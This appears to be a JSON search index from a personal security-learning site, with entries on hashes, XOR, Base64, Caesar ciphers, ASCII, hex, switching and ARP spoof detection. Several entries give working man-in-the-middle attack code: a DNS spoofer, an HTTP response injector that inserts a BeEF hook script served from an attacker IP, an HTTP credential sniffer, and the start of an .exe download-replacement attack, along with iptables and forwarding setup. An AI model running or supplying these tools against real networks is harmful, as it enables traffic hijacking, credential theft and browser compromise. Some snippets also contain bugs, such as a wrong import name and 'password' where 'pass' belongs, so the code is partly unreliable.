\u0026#39;5bcca117c56a831c0a5b6c14c4bf3b16e10c610ca79f51165e899fd6267639e4333c8a1f973688d7c88b3950f58961d75bc5d4036ded30a10fb6432317abdd8a\u0026#39; There is no algorithm to reverse hashes What you can do is guess the data and hope you find a match As an example, suppose you have the following hash: db0edd04aaac4506f7edab03ac855d56 You could use a password list, calculate the hash for each password in that list and compare the result to your hash. Since MD5 and the SHA family are designed to calculate hashes very fast you could potentially calculate millions of passwords per second. import hashlib for p in \u0026#34;1234567890\u0026#34;: guess = \u0026#34;password\u0026#34; + p h = hashlib.new(\u0026#34;md5\u0026#34;, guess).hexdigest() print guess, h Output:\npassword1 7c6a180b36896a0a8c02787eeafb0e4c password2 6cb75f652a9b52798eb6cf2201057c73 password3 819b0643d6b89dc9b579fdfc9094f28e password4 34cc93ece0ba9e3f6f235d4af979b16c password5 db0edd04aaac4506f7edab03ac855d56 \u0026lt;---- we got a match, the password is \u0026#39;password5\u0026#39; password6 218dd27aebeccecae69ad8408d9a36bf password7 00cdb7bb942cf6b290ceb97d6aca64a3 password8 b25ef06be3b6948c0bc431da46c2c738 password9 5d69dd95ac183c9643780ed7027d128a password0 305e4f55ce823e111a46a9d500bcb86c ","description":"What is a hash? A hash is a way to make a \u0026lsquo;fingerprint\u0026rsquo; of a file You take all the bytes of a file and combine them together using a hashing algorithm This creates a fixed length hash value Changing any part of the file will result in a completely different hash value when recalculating So when you have two files that are supposed to be identical, you can verify this by comparing the hashes."},{"id":19,"href":"/cryptography/ciphers/xor/","title":"XOR Cipher","parent":"Ciphers","content":"In cryptography, the simple XOR cipher is a type of additive cipher.\nXOR is short for exclusive or. It is a bitwise operator.\nIf one of the two operands, but not both are true, the statement is true.\nXOR truth table:\nIn the following example we ask for input text and key then calculate the length of the input string and store it in n.\nThen we iterate over each byte (each ASCII character) and perform a XOR operation (k XOR b in below example) on each bit within the byte.\nPython indicates XOR with the ^ operator.\nIn python chr(i) returns a string of one character whose ASCII code is the integer i.\nIf the key is a single byte like \u0026ldquo;A\u0026rdquo;, then you use the same byte to encrypt every character of the plain text. You just keep repeating it over and over (Capital A for this byte, capital A for the next byte, etc..). If the key is multi-byte, for example: \u0026ldquo;BC\u0026rdquo; then you repeat the pattern, you use capital B for the first byte, capital C for the next byte, capital B for the third byte etc.\nk = key[i%len(key)] This makes sure the key stays within bounds of the length of the key by performing modulus (\u0026ldquo;clock arithmetic\u0026rdquo;)\nSo if the key is \u0026ldquo;qrs\u0026rdquo; the value of i within the for loop statement k = key[i%len(key)] will be either 0,1 or 2.\nThis is how the pattern of the multi-byte key is repeated \u0026lsquo;over\u0026rsquo; the text.\ntext = raw_input(\u0026#34;Enter text: \u0026#34;) key = raw_input(\u0026#34;Enter key: \u0026#34;) n = len(text) for i in range(n): t = text[i] k = key[i%len(key)] x = ord(k) ^ ord(t) print t, k, x, chr(x) Sample in/output:\nEnter text: HELLO Enter key: qrs H q 57 9 E r 55 7 L s 63 ? L q 61 = O r 61 = To break this down for the first byte:\nThe character H in ASCII is 01001000 in binary The character q in ASCII is 01110001 in binary XORRING these bytes: |0|1|0|0|1|0|0|0| |0|1|1|1|0|0|0|1| |0|0|1|1|1|0|0|1| 00111001 is 57 in decimal and when we look up 57 in the ASCII table it is the character 9\nIf you combine upper and lower case characters XOR often produces unprintable bytes.\nThe best way to handle the output is not to print it with ASCII but instead print it as HEX encoded values.\ntext = raw_input(\u0026#34;Enter text: \u0026#34;) key = raw_input(\u0026#34;Enter key: \u0026#34;) n = len(text) cipher = \u0026#34;\u0026#34; for i in range(n): t = text[i] k = key[i%len(key)] x = ord(k) ^ ord(t) cipher += chr(x) print text, key, cipher.encode(\u0026#34;hex\u0026#34;) Suppose we need to decrypt the following ciphertext: kquht} and we know the key is a single ASCII digit.\nThe following code will loop threw all 10 digits and perform a XOR operation using every single digit.\ntext = raw_input(\u0026#34;Enter text: \u0026#34;) n = len(text) for k in \u0026#34;0123456789\u0026#34;: clear = \u0026#34;\u0026#34; for i in range(n): t = text[i] x = ord(k) ^ ord(t) clear += chr(x) print k, clear Output:\n0 [AEXDM 1 Z@DYEL 2 YCGZFO 3 XBF[GN 4 _EA\\@I 5 ^D@]AH 6 ]GC^BK 7 \\FB_CJ 8 SIMPLE \u0026lt;--- 9 RHLQMD When we have a HEX encoded ciphertext of \u0026lsquo;70155d5c45415d5011585446424c\u0026rsquo; and we know the key is 2 ASCII digits, we need to decode the encoded string first.\nThen bruteforce threw all digits from 10-99 (skipped the first range 00 - 09 because) to get the desired deciphered text. Yah \\o/\nc = \u0026#34;70155d5c45415d5011585446424c\u0026#34; text = raw_input(\u0026#34;Enter text: \u0026#34;).decode(\u0026#34;hex\u0026#34;) n = len(text) for key in range(10,99): key = str(key) clear = \u0026#34;\u0026#34; for i in range(n): t = text[i] k = key[i%len(key)] x = ord(k) ^ ord(t) clear += chr(x) print key, clear Output:\nEnter text: 70155d5c45415d5011585446424c 10 A%lltql hevs| 11 Almtpla iews} 12 Alntslb jets~ 13 A\u0026amp;lotrlc keus 14 A!lhtuld lersx 15 A little messy \u0026lt;--- Or a different approach:\ntexth = raw_input(\u0026#34;Enter hex plaintext: \u0026#34;) text = texth.decode(\u0026#34;hex\u0026#34;) n = len(text) for k1 in \u0026#34;0123456789\u0026#34;: for k2 in \u0026#34;0123456789\u0026#34;: key = k1 + k2 clear = \u0026#34;\u0026#34; for i in range(n): t = text[i] k = key[i%2] x = ord(k) ^ ord(t) clear += chr(x) print key, clear Why XOR is associative and commutative commutative = a group of quantities connected by operators gives the same result whatever the order of the quantities involved, e.g. a × b = b × a. associative = a group of quantities connected by operators gives the same result whatever their grouping, i.e. in whichever order the operations are performed, as long as the order of the quantities remains the same, e.g. (12) * 3 = 6\n(13) * 2 = 6\n(2*3) * 1 = 6\nAn intuitive way of understanding why XOR is associative is as follows:\nFirst recognize that XOR is commutative, that is, a⊕b=b⊕a. This can be done using the truth table.\nThen, think of the XOR operator as a \u0026lsquo;conditional flip\u0026rsquo; operator, that is think of a⊕b as saying if a is 1, take flipped b as the output, while if a is 0, take b as the output. Because of the commutative property, a⊕b is completely equivalent to b⊕a which says that b conditionally flips a.\nNow consider a⊕(b⊕c). This is saying that b conditionally flips c, the result of which is itself conditionally flipped by a. Because of the nature of the flipping operation, ultimately c is conditionally flipped by both b and a, and it doesn\u0026rsquo;t matter in which order these two flip operations are performed.\nBecause of this, it is seen that a⊕(b⊕c) is equivalent to b⊕(a⊕c).\nFinally, by using commutativity, one can write a⊕(b⊕c)=(b⊕c)⊕a, which was just showed to be equivalent to b⊕(a⊕c), itself equivalent to b⊕(c⊕a) by commutativity.\nTherefore, (b⊕c)⊕a=b⊕(c⊕a) which proves associativity.\n","description":"In cryptography, the simple XOR cipher is a type of additive cipher.\nXOR is short for exclusive or. It is a bitwise operator.\nIf one of the two operands, but not both are true, the statement is true.\nXOR truth table:\nIn the following example we ask for input text and key then calculate the length of the input string and store it in n.\nThen we iterate over each byte (each ASCII character) and perform a XOR operation (k XOR b in below example) on each bit within the byte."},{"id":20,"href":"/data/base64_encoding/","title":"Base64","parent":"data","content":"Base-64 encoding is a way encoding binary data into ASCII text so that it\u0026rsquo;s more easily transmitted in things like e-mail and HTML form data.\nEach Base64 digit represents exactly 6 bits of data. Three 8-bit bytes (i.e., a total of 24 bits) can therefore be represented by four 6-bit Base64 digits.\nIf you have an ASCI string of 3 characters (=3 bytes) it turns into 24 bits, interpreted as 3 groups of 8 bits.\nIf you then break them up into 4 groups of 6 bits you now have 4 numbers within 0 and 63.\nThen use the lookup table below.\nIf you have something other then 3 bytes, for example say you have 4 bytes of data for the input, then base64 end with two equal signs (==) to indicate it had to add two characters of padding. If you have 5 bytes you have 1 equal sign. If you have 6 bytes there are no equal signs, indicating the input fits neatly into base64 with no need for padding.\nBase64 is not encrypting, it is not hiding anything. It is just another way to represent data.\nIf for example you would like to email someone an executable you could send the encoded binary data:\nwith open (\u0026#34;file.exe\u0026#34;,\u0026#34;rb\u0026#34;) as f: data = f.read() print data.encode(\u0026#34;base64\u0026#34;) ADeFhAAIAAAAAAAAAAAAAAAqB0AAAAAAABJEigA\\ nAAAAAIcEAAAAAAAA9F0IACA4HgAs7gIACcADAP2 VAQDgHgAAqB0AAAAAAABJEigAAAAAAIcEAAAA\\ nAAAAqB0AAAAAAADRFigAAAAAAMcEAAAAAAAAApYB ACywAADEzygAIAAAAAAAAAAAAAAAqB0AAAAA\\nAAC Or decoding:\ndata = \u0026#34;VGhpcyBpcyB0b28gZWFzeQ==\u0026#34; data.decode(\u0026#34;base64\u0026#34;) \u0026#39;This is too easy\u0026#39; Example of decoding something that has been encoded several times:\n#!/usr/bin/env python import base64 a = \u0026#39;VkVjNWRtRXpUV2RhTWpsMldrRTlQUT09\u0026#39; def decodeit(data): return data.decode(\u0026#34;base64\u0026#34;) while True: try: a = decodeit(a) print(a) # we probably found the solution if we get a padding error so exit except: exit() Output would be:\nVEc5dmEzTWdaMjl2WkE9PQ== TG9va3MgZ29vZA== Looks good More details: http://www.hcidata.info/base64.htm\n","description":"Base-64 encoding is a way encoding binary data into ASCII text so that it\u0026rsquo;s more easily transmitted in things like e-mail and HTML form data.\nEach Base64 digit represents exactly 6 bits of data. Three 8-bit bytes (i.e., a total of 24 bits) can therefore be represented by four 6-bit Base64 digits.\nIf you have an ASCI string of 3 characters (=3 bytes) it turns into 24 bits, interpreted as 3 groups of 8 bits."},{"id":21,"href":"/cryptography/ciphers/caesar_cipher/","title":"Caesar Cipher \u0026 ROT13","parent":"Ciphers","content":" Caesar Cipher The Caesar cipher is one of the earliest known and simplest ciphers.\nIt is a type of substitution cipher in which each letter in the plaintext is \u0026lsquo;shifted\u0026rsquo; 3 numbers of places down the alphabet.\nIn python we first define an alphabet string. When the ask for user input. We store the length of the user input into the n variable. We then iterate over each character in the string and find its location within the alphabet string and store it in the loc variable. Then we make the shift happen by\nnewloc = (loc + shift) % 26 We then look up the shifted value in the alphabet and add it to str_out\n#!/usr/bin/env python alphabet = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; str_in = raw_input(\u0026#34;Enter text in capitals: \u0026#34;) shift = 3 n = len(str_in) str_out = \u0026#34;\u0026#34; print \u0026#34;i \u0026#34; + \u0026#34;c \u0026#34; + \u0026#34;l \u0026#34; \u0026#34;nl \u0026#34; + \u0026#34;out \u0026#34; for i in range(n): c = str_in[i] loc = alphabet.find(c) print i, c, loc, # use modulus 26 since we have 26 characters in the alphabet newloc = (loc + shift) % 26 str_out += alphabet[newloc] print newloc, str_out print \u0026#39;Obfuscated version:\u0026#39;, str_out The problem with Caesar cipher is that the keyspace is very small: {1, 2, \u0026hellip; 26}\nROT13 ROT13 is the same caesar cipher code like above with a shift value 13. If you run one cycle of ROT13 and then run it again on the result of the first cycle it decrypts itself. 26 / 2 = 13. So HELLO becomes URYYB and running ROT13 on URYYB results in HELLO.\nThis is an important feature because there are quite a few cryptographic functions that have this property. Where you encrypt something once and when you encrypt it again you reverse the process, instead of becoming more encrypted it becomes unencrypted.\nBruteforce attack To bruteforce you\u0026rsquo;re way threw all possible shift values:\nalpha = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; str_in = raw_input(\u0026#34;Enter ciphertext: \u0026#34;) for shift in range(26): n = len(str_in) str_out = \u0026#34;\u0026#34; for i in range(n): c = str_in[i] loc = alpha.find(c) newloc = (loc + shift)%26 str_out += alpha[newloc] print shift, str_out Output:\nEnter ciphertext: MYXQBKDEVKDSYXC 0 MYXQBKDEVKDSYXC 1 NZYRCLEFWLETZYD 2 OAZSDMFGXMFUAZE 3 PBATENGHYNGVBAF 4 QCBUFOHIZOHWCBG 5 RDCVGPIJAPIXDCH 6 SEDWHQJKBQJYEDI 7 TFEXIRKLCRKZFEJ 8 UGFYJSLMDSLAGFK 9 VHGZKTMNETMBHGL 10 WIHALUNOFUNCIHM 11 XJIBMVOPGVODJIN 12 YKJCNWPQHWPEKJO 13 ZLKDOXQRIXQFLKP 14 AMLEPYRSJYRGMLQ 15 BNMFQZSTKZSHNMR 16 CONGRATULATIONS \u0026lt;------ :) 17 DPOHSBUVMBUJPOT 18 EQPITCVWNCVKQPU 19 FRQJUDWXODWLRQV 20 GSRKVEXYPEXMSRW 21 HTSLWFYZQFYNTSX 22 IUTMXGZARGZOUTY 23 JVUNYHABSHAPVUZ 24 KWVOZIBCTIBQWVA 25 LXWPAJCDUJCRXWB 26 MYXQBKDEVKDSYXC ","description":"Caesar Cipher The Caesar cipher is one of the earliest known and simplest ciphers.\nIt is a type of substitution cipher in which each letter in the plaintext is \u0026lsquo;shifted\u0026rsquo; 3 numbers of places down the alphabet.\nIn python we first define an alphabet string. When the ask for user input. We store the length of the user input into the n variable. We then iterate over each character in the string and find its location within the alphabet string and store it in the loc variable."},{"id":22,"href":"/networking/switches/","title":"L2 vs L3 switch","parent":"networking","content":"When you ping across (so when you go from one interface to another/from one subnet to another) a router or a layer 3 switch, the layer 2 information is updated at each HOP (meaning the layer 2 headers are updated). The layer 3 information remains the same unless NAT is used.\nWhen you move from one VLAN to another VLAN on a layer3 switch, or move from one interface to another interface on a router the layer3 information is not changed but the layer 2 headers are rewritten.\nA router is a layer3 device, it makes routing deciscion based on IP addresses and it rewrites MAC addresses. Layer3 switches also operate at this layer.\nTraditional switching operates at layer 2 of the OSI model, where packets are sent to a specific switch port based on destination MAC addresses. Routing operates at layer 3, where packets are sent to a specific next-hop IP address, based on destination IP address. Devices in the same layer 2 segment do not need routing to reach local peers. What is needed however is the destination MAC address which can be resolved through the Address Resolution Protocol (ARP) as illustrated below:\nHere, PC A wants to send traffic to PC B at IP address 192.168.1.6. It does not know the unique MAC address however, until it discovers it through an ARP, which is broadcasted throughout the layer 2 segment:\nIt then sends the packet to the appropriate destination MAC address which the switch will then forward out the correct port based on its MAC-Address-Table.\nWithin a layer 2 switch environment exists a broadcast domain. Any broadcast traffic on a switch will be forwarded out all ports with the exception of the port the broadcast packet arrived on. Broadcasts are contained in the same layer 2 segment, as they do not traverse past a layer 3 boundary.\nLarge layer 2 broadcast domains can be susceptible to certain unintended problems, such as broadcast storms, which have the ability to cause network outages. Also, it may be preferable to separate certain clients into different broadcast domains for security and policy reasons. This is when it becomes useful to configure VLANs. A layer 2 switch can assign VLANs to specific switch ports, which in turn are in different layer 3 subnets, and therefore in different broadcast domains. VLANs allow for greater flexibility by allowing different layer 3 networks to be sharing the same layer 2 infrastructure. The image below shows an example of a multi-VLAN environment on a layer 2 switch:\nSince VLANs exist in their own layer 3 subnet, routing will need to occur for traffic to flow in between VLANs. This is where a layer 3 switch can be utilized. A Layer 3 switch is basically a switch that can perform routing functions in addition to switching. A client computer requires a default gateway for layer 3 connectivity to remote subnets. When the computer sends traffic to another subnet, the destination MAC address in the packet will be that of the default gateway, which will then accept the packet at layer 2, and proceed to route the traffic to the appropriate destination based on its routing table.\nThe diagram below shows an example of a layer 3 switching routing between VLANs through its two VLAN interfaces. As before, the layer 3 device will still need to resolve the MAC address of PC B through an ARP request broadcasted out to VLAN 20. It then rewrites the appropriate destination MAC address and forwards the packet back out the layer 2 segment:\nWhen packets move from one VLAN to another VLAN on a layer3 switch, or move from one interface to another interface the layer3 information is unchanged but the layer 2 headers are rewritten. The layer 3 information remains the same unless NAT is used.\n","description":"When you ping across (so when you go from one interface to another/from one subnet to another) a router or a layer 3 switch, the layer 2 information is updated at each HOP (meaning the layer 2 headers are updated). The layer 3 information remains the same unless NAT is used.\nWhen you move from one VLAN to another VLAN on a layer3 switch, or move from one interface to another interface on a router the layer3 information is not changed but the layer 2 headers are rewritten."},{"id":23,"href":"/arp/arp_spoof_detector/","title":"ARP spoof detection","parent":"arp","content":"In order to detect if we are under attack we can use following code. It will check if the MAC address (.hwsrc field in ARP reply packet) that is associated with the spoofed IP address that the attacker is sending with the packet (.psrc field in ARP reply packet) differs from what we get back (=real mac address) when we run get_mac function.\nSome words on defense: https://security.stackexchange.com/questions/161173/how-exactly-do-you-protect-against-arp-spoofing-in-large-lans\n#!/usr/bin/env python import scapy.all as scapy_packet def get_mac(ip): arp_request = scapy.ARP(pdst=ip) broadcast = scapy.Ether(dst=\u0026#34;ff:ff:ff:ff:ff:ff\u0026#34;) arp_request_broadcast = broadcast/arp_request answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] if answered_list: return answered_list[0][1].hwsrc else: return None def sniff(interface): scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) def process_sniffed_packet(packet): if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2: try: real_mac = get_mac(packet[scapy.ARP].psrc) response_mac = packet[scapy.ARP].hwsrc if real_mac != response_mac: print(\u0026#34;[+] Arp spoof attack detected!\u0026#34;) except IndexError: password sniff(\u0026#34;enp7s0\u0026#34;) ","description":"In order to detect if we are under attack we can use following code. It will check if the MAC address (.hwsrc field in ARP reply packet) that is associated with the spoofed IP address that the attacker is sending with the packet (.psrc field in ARP reply packet) differs from what we get back (=real mac address) when we run get_mac function.\nSome words on defense: https://security.stackexchange.com/questions/161173/how-exactly-do-you-protect-against-arp-spoofing-in-large-lans\n#!/usr/bin/env python import scapy."},{"id":24,"href":"/data/binary/","title":"Binary","parent":"data","content":"Binary is Base 2, unlike our Decimal counting system which is Base 10. In other words, Binary has only 2 different numerals (0 and 1) to denote a value, unlike Decimal which has 10 numerals (0,1,2,3,4,5,6,7,8 and 9). A value in binary is sometimes represented by prepending the prefix 0b to the value.\nExample: 0b01011101\n","description":"Binary is Base 2, unlike our Decimal counting system which is Base 10. In other words, Binary has only 2 different numerals (0 and 1) to denote a value, unlike Decimal which has 10 numerals (0,1,2,3,4,5,6,7,8 and 9). A value in binary is sometimes represented by prepending the prefix 0b to the value.\nExample: 0b01011101"},{"id":25,"href":"/web/http/ssl_stripping/","title":"SSL stripping","parent":"HTTP","content":"https://moxie.org/software/sslstrip/\nSslstrip requires that the connection between the client and the sslstrip instance is done over plain HTTP.\nThe connection from sslstrip to the webserver can be either HTTP and HTTPS.\nThis means that if the client first requests the site with plain HTTP then sslstrip works. If instead the clients starts already with HTTPS since it either knows that the site is only accessible by HTTPS or if the browser enforces HTTPS because of a HSTS policy (preloaded or from earlier visits) then sslstrip will not work.\nClarification:\nThe attacker sits between the victim and a server. When the attackers receives an HTTP request from the victim, the attacker sends the request to the server using HTTPS. When the attacker receives the response from the server, it strips away the HTTPS links and then forwards the response to the victim using HTTP.\nIt can strip all this data because it is the attacker who has initiated the encrypted channel with the webserver, NOT the client. The client is only spoon fed HTTP data. Sslstrip analyses the response headers and\nremoves accept-encoding removes if-modified-since\nThis is so the client has to make a full request to the server, even if the page hasn\u0026rsquo;t been modified. This header needs to be removed because otherwise there is no complete request to the server and nothing to intercept.\nremoves cache-control\nThis is for the same reason as if-modified-since, so the client doesn\u0026rsquo;t try to load the page from a cache and avoid making a complete request to the request to the server.\nchanges link in Location header to HTTP\n","description":"https://moxie.org/software/sslstrip/\nSslstrip requires that the connection between the client and the sslstrip instance is done over plain HTTP.\nThe connection from sslstrip to the webserver can be either HTTP and HTTPS.\nThis means that if the client first requests the site with plain HTTP then sslstrip works. If instead the clients starts already with HTTPS since it either knows that the site is only accessible by HTTPS or if the browser enforces HTTPS because of a HSTS policy (preloaded or from earlier visits) then sslstrip will not work."},{"id":26,"href":"/data/ascii/","title":"ASCII","parent":"data","content":" Character set . Often used to represent english language characters. Originally it was 7-bit binary, which gave us 128 unique characters. The current standard is 8-bit (1 byte) or equivalently 2 hex digits per character. Computers can only understand numbers, so an ASCII code is the numerical representation of a character such as \u0026lsquo;a\u0026rsquo; or \u0026lsquo;1\u0026rsquo;.\nExample:\ncharacter \u0026ldquo;1\u0026rdquo; hex 0x31 first nibble = 3 which is 0011 in binary (count the weight of the columns: 8421) second nibble = 1 = which is 0001 in binary (count the weight of the columns: 8421) The full byte binary value is 0011 0001 which is 49 in decimal (32+16+1) The key thing to remember: the character \u0026ldquo;1\u0026rdquo; is NOT the same thing as the number 1.\nSo if you have a character \u0026ldquo;1\u0026rdquo; in a file, it is not stored as a single bit 1. It is stored as the byte 0x31 that can be looked up in the table.\n","description":"Character set . Often used to represent english language characters. Originally it was 7-bit binary, which gave us 128 unique characters. The current standard is 8-bit (1 byte) or equivalently 2 hex digits per character. Computers can only understand numbers, so an ASCII code is the numerical representation of a character such as \u0026lsquo;a\u0026rsquo; or \u0026lsquo;1\u0026rsquo;.\nExample:\ncharacter \u0026ldquo;1\u0026rdquo; hex 0x31 first nibble = 3 which is 0011 in binary (count the weight of the columns: 8421) second nibble = 1 = which is 0001 in binary (count the weight of the columns: 8421) The full byte binary value is 0011 0001 which is 49 in decimal (32+16+1) The key thing to remember: the character \u0026ldquo;1\u0026rdquo; is NOT the same thing as the number 1."},{"id":27,"href":"/dns/dns_spoofing/","title":"DNS spoofing","parent":"dns","content":"After we become the mitm we can spoof DNS answers, by modifying the rdata field in the DNS Response request packet.\nAfter spoofing the rdata field will contain a spoofed ip address of a attacker server instead of the original servers IP address.\nFor this we need to modify packets on the fly. With scapy alone this is not possible, we need to use NetfilterQueue.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:\necho \u0026#39;1\u0026#39; \u0026gt; /proc/sys/net/ipv4/ip_forward iptables -I FORWARD -j NFQUEUE --queue-num 0 Or without arp spoofing on local machine:\niptables -I OUTPUT -j NFQUEUE --queue-num 0 iptables -I INPUT -j NFQUEUE --queue-num 0 import netfilterqueue from scapy.all import IP import scapy.all as scapy def process_packet(packet): scapy_packet = scapy.IP(packet.get_payload()) if scapy_packet.haslayer(scapy.DNSRR): qname = scapy_packet[scapy.DNSQR].qname if \u0026#34;nrc.nl\u0026#34; in qname: print(\u0026#34;[+] Spoofing target\u0026#34;) answer = scapy.DNSRR(rrname=qname, rdata=\u0026#34;192.168.178.12\u0026#34;) scapy_packet[scapy.DNS].an = answer scapy_packet[scapy.DNS].ancount = 1 del scapy_packet[scapy.IP].len del scapy_packet[scapy.IP].chksum del scapy_packet[scapy.UDP].chksum del scapy_packet[scapy.UDP].len packet.set_payload(str(scapy_packet)) packet.accept() queue = netfilterqueue.NetfilterQueue() queue.bind(0, process_packet) queue.run() ","description":"After we become the mitm we can spoof DNS answers, by modifying the rdata field in the DNS Response request packet.\nAfter spoofing the rdata field will contain a spoofed ip address of a attacker server instead of the original servers IP address.\nFor this we need to modify packets on the fly. With scapy alone this is not possible, we need to use NetfilterQueue.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:"},{"id":28,"href":"/data/hex/","title":"Hex","parent":"data","content":"Hexadecimal is a base 16 system used to simplify how binary is represented.\nA hex digit can be any of the following 16 digits: 0 1 2 3 4 5 6 7 8 9 A B C D E F.\nEvery HEX digit is represented by a sequence of 4 bits (also sometimes called a \u0026ldquo;nibble\u0026rdquo;).\n4 bits is exactly half of a byte, which is 8 bits.\nA value in HEX is often represented by prepending the prefix 0x to the value.\n0x1F is pronounced as: \u0026ldquo;hex-one-f\u0026rdquo;\nAn 8-bit binary number can be written using only two different hex digits - one hex digit for each nibble (or group of 4-bits).\nIt is much easier to write numbers as hex than to write them as binary numbers.\nHex codes are used in many areas of computing to simplify binary codes. It is important to note that computers do not use hexadecimal - it is used by humans to shorten binary to a more easily understandable form. Hexadecimal is translated into binary for computer use. Some examples of where hex is used include:\ncolour references assembly language programs error messages Converting between binary and hexadecimal:\nConverting between decimal and hexadecimal:\n","description":"Hexadecimal is a base 16 system used to simplify how binary is represented.\nA hex digit can be any of the following 16 digits: 0 1 2 3 4 5 6 7 8 9 A B C D E F.\nEvery HEX digit is represented by a sequence of 4 bits (also sometimes called a \u0026ldquo;nibble\u0026rdquo;).\n4 bits is exactly half of a byte, which is 8 bits.\nA value in HEX is often represented by prepending the prefix 0x to the value."},{"id":29,"href":"/web/http/http_code_injection/","title":"HTTP code injection \u0026 BeEF","parent":"HTTP","content":"After we become the mitm we can modify HTTP responses by changing the Raw data on the fly.\nSince most clients will request [content encoding][http_compression] (by adding a \u0026ldquo;Accept-Encoding\u0026rdquo; header), the HTTP response data (scapy.Raw layer) will look like gibberish.\nThis is is because the data is GZIPPED most of the time. To get around this we can simply delete this header from the HTTP request!\nhttps://en.wikipedia.org/wiki/HTTP_compression\nWe also need to make sure we change the size of the \u0026ldquo;Content-Length\u0026rdquo; value to match with our injected code.\nOtherwise the client browser will not accept the server response.\nIn the below example code we then use BeEF on our attacker machine. BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. The key to success with BeEF is to \u0026ldquo;hook\u0026rdquo; a browser. This basically means that we need the victim to visit a vulnerable web app (or as shown in the below code example just by browsing to a HTTP website that has a particular string in the body text). This injected code in the \u0026ldquo;hooked\u0026rdquo; browser then responds to commands from the BeEF server. From there, we can do a number of malicious things on the victim\u0026rsquo;s computer.\nOn Parrot OS i first opened BeEF Framework and then logged in with the default credentials for BeEF: beef/beef at: http://localhost:3000/ui/authentication\nIn the below example we are modifying HTTP responses and injecting the BeEF Hook javascript code into it. Evil stuff :-P\nI successfully tested all this on a Windows 10 victim PC with Chrome browser by visiting a HTML site that had a particular string in the body and replacing this with injected code.\nI then verified the browser was hooked in BeEF on my attacker machine. Then i succesfully send a JS alert via BeEF (commands \u0026gt; browser \u0026gt; hooked domain \u0026gt; create alert dialog).\n# !/usr/bin/env python import netfilterqueue import scapy.all as scapy import re ack_list = [] def set_load(packet, load): packet[scapy.Raw].load = load del packet[scapy.IP].len del packet[scapy.IP].chksum del packet[scapy.TCP].chksum return packet def process_packet(packet): scapy_packet = scapy.IP(packet.get_payload()) if scapy_packet.haslayer(scapy.Raw): load = scapy_packet[scapy.Raw].load if scapy_packet[scapy.TCP].dport == 80: print(\u0026#34;[+] Request\u0026#34;) load = re.sub(\u0026#34;Accept-Encoding:.*?\\\\r\\\\n\u0026#34;, \u0026#34;\u0026#34;, scapy_packet[scapy.Raw].load) elif scapy_packet[scapy.TCP].sport == 80: print(\u0026#34;[+] Response\u0026#34;) print(scapy_packet.show()) injection_code = \u0026#39;\u0026lt;script src=\u0026#34;http://192.168.178.18:3000/hook.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026#39; load = scapy_packet[scapy.Raw].load.replace(\u0026#39;\u0026lt;meta property=\u0026#34;og:title\u0026#34; content=\u0026#34;Home\u0026#34;/\u0026gt;\u0026#39;, injection_code) content_length_search = re.search(\u0026#34;(?:Content-Length:\\s)(\\d*)\u0026#34;, load) if content_length_search and \u0026#34;text/html\u0026#34; in load: content_length = content_length_search.group(1) new_content_length = int(content_length) + len(injection_code) load = load.replace(content_length, str(new_content_length)) if load != scapy_packet[scapy.Raw].load: new_packet = set_load(scapy_packet, load) packet.set_payload(str(new_packet)) packet.accept() queue = netfilterqueue.NetfilterQueue() queue.bind(0, process_packet) queue.run() ","description":"After we become the mitm we can modify HTTP responses by changing the Raw data on the fly.\nSince most clients will request [content encoding][http_compression] (by adding a \u0026ldquo;Accept-Encoding\u0026rdquo; header), the HTTP response data (scapy.Raw layer) will look like gibberish.\nThis is is because the data is GZIPPED most of the time. To get around this we can simply delete this header from the HTTP request!\nhttps://en.wikipedia.org/wiki/HTTP_compression\nWe also need to make sure we change the size of the \u0026ldquo;Content-Length\u0026rdquo; value to match with our injected code."},{"id":30,"href":"/web/http/credentials_sniffer/","title":"HTTP credentials sniffing","parent":"HTTP","content":"After we become the mitm we can sniff all HTTP requests. This time using scapy\u0026rsquo;s buildin sniffing function.\nIn the code we are checking for HTTP credentials.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:\nFull code:\nimport scapy.all as scapy from scapy.layers import http def sniff(interface): scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) def get_url(packet): return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path def get_login_info(packet): if packet.haslayer(scapy.Raw): load = packet[scapy.Raw].load keywords = [\u0026#34;pwd\u0026#34;] for keyword in keywords: if keyword in load: return load def process_sniffed_packet(packet): if packet.haslayer(http.HTTPRequest): url = get_url(packet) print(\u0026#34;[+] HTTP Request \u0026gt;\u0026gt; \u0026#34; + url) login_info = get_login_info(packet) if login_info: print(\u0026#34;\\n[+] Possible username/password \u0026gt; \u0026#34; + login_info + \u0026#34;\\n\u0026#34;) sniff(\u0026#34;enp7s0\u0026#34;) ","description":"After we become the mitm we can sniff all HTTP requests. This time using scapy\u0026rsquo;s buildin sniffing function.\nIn the code we are checking for HTTP credentials.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:\nFull code:\nimport scapy.all as scapy from scapy.layers import http def sniff(interface): scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) def get_url(packet): return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path def get_login_info(packet): if packet."},{"id":31,"href":"/web/http/replace_download/","title":"Modifying HTTP download response","parent":"HTTP","content":"After we become the mitm we can modify HTTP responses by changing the Raw data.\nIn this case we check if the victim is downloading a .exe file and we are changing the response from the server so that it includes are own malicious payload.\nWe do check against the destination port (dport) and source port (sport). When a sport is present it is a response, when a dport is present it is a request.\nFor this we need to modify packets on the fly. With scapy alone this is not possible, we need to use NetfilterQueue.\nTo get this code to work you first need to run arp cache poisoning and run this command on attacker machine:\niptables -I FORWARD -j NFQUEUE --queue-num 0 Or without arp spoofing on local machine:\niptables -I OUTPUT -j NFQUEUE --queue-num 0 iptables -I INPUT -j NFQUEUE --queue-num 0 Full code:\n# !/usr/bin/env python import netfilterqueue import scapy.all as scapy ack_list = [] def set_load(packet, load): packet[scapy.Raw].load = load del packet[scapy.IP].len del packet[scapy.IP].chksum del packet[scapy.TCP].chksum return packet def process_packet(packet): scapy_packet = scapy.IP(packet.get_payload()) if 